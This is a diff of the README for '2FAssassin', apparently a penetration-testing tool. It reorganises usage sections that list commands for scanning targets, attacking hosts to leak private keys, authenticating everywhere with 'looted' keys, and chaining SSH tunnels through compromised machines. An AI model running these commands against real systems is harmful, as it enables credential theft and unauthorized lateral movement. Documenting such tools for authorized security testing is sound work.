@@ -69,14 +69,6 @@ root@kali:~/2fassassin#
 
 ## Simplified Architecture ##
 
-# Overall:
-to be updated soon
-
-
-
-
-
-# Key-based:
 
                               Network Enumeration
                                       +
@@ -114,12 +106,17 @@ to be updated soon
 ./assassin.py --scan basic --target 192.168.2.40
 
 
-- AUTOMATIC MODE: 
+AUTOMATIC MODE
+--------------
+
 * Check everythings (common vulnerabilities) that cause the private keys to leak out.
 ./assassin.py --check auto --mode attack  
 
 
-- Manual MODE: 
+
+Manual MODE
+-----------
+
 * SSH-based Attacks to get private keys 
 ./assassin.py --check ssh --mode attack      
 
@@ -145,12 +142,25 @@ to be updated soon
 ./assassin.py --check quantum --mode attack
 
 
-- POST MODE:
+POST MODE
+---------
+
 * Once you looted the private keys, perform key-based authentication to all targets in the database
 ./assassin.py --check ssh --mode auth
 
 
-- Administration:
+Tunnelling
+-----------
+
+- Create ssh tunnel using looted private keys (greater the chain value, longer the ssh tunnel)
+./assassin.py --tunnel ssh --chain 1 --user <username> --secret password --user2 <username> --host <server_ip>
+./assassin.py --tunnel ssh --chain 2 --user <username> --secret password --user2 <username2> --host <server_ip> --user3 <username3> --host2 <server_ip2> 
+./assassin.py --tunnel ssh --chain 3 --user <username> --secret password --user2 <username2> --host <server_ip> --user3 <username3> --host2 <server_ip2> --user4 <username4> --host3 <server_ip3>
+
+
+Administration
+---------------
+
 * View activity output:           
 ./assassin.py --log all
 
@@ -164,23 +174,21 @@ to be updated soon
 ./assassin.py --log account --host <target_host>
 
 
-## Scenario Usage (Examples) ##
 
-- Check if a remote host used Key-based Authentication
+Investigation
+--------------
+
+* Check if a remote host used Key-based Authentication
 ./assassin.py --check key --mode detect
 
-
-- Find out which machine hosting the user account
+* Find out which machine hosting the user account
 ./assassin.py --log whereis --user <username>
 
-
-- Find out What accounts can potentially be accessed by a specific user
+* Find out What accounts can potentially be accessed by a specific user
 ./assassin.py --log  account --host <ip_address>
 
-- Create ssh tunnel using looted private keys (greater the chain value, longer the ssh tunnel)
-./assassin.py --tunnel ssh --chain 1 --user <username> --secret password --user2 <username> --host <server_ip>
-./assassin.py --tunnel ssh --chain 2 --user <username> --secret password --user2 <username2> --host <server_ip> --user3 <username3> --host2 <server_ip2> 
-./assassin.py --tunnel ssh --chain 3 --user <username> --secret password --user2 <username2> --host <server_ip> --user3 <username3> --host2 <server_ip2> --user4 <username4> --host3 <server_ip3>
+* Look for potential certificate files
+./assassin.py --cert analyze --filetype pfx
 
 
 
